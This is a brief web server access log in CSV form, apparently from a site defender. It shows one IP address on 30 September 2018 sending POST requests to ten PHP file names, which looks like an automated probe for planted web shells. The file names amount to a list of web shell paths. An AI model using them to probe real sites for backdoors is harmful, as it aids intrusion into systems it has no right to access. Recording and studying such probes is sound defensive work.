IP,DATE,METHOD,URI,User Agent
"190.102.146.26","30/Sep/2018","POST","/wuwu11.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/xw.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/xw1.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/9678.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/wc.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/xx.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/s.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/w.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/sheep.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/qaq.php","Trident/4.0)"

